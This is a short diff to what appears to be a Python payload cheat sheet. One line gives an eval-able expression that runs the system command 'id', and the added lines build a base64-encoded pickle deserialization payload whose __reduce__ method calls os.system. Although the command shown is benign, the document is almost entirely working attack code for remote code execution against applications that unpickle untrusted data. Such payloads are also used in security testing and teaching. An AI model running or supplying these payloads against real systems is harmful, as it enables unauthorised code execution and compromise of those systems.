@@ -3,3 +3,14 @@ syntax: python
 ---
 # Expression that can be eval'ed in order to execute system commands
 __import__('os').system('id')
+
+# Generate pickle'd RCE payload for deserialization attack
+import base64
+import os
+import pickle
+class RCE:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+print(base64.b64encode(pickle.dumps(RCE("id"))).decode())
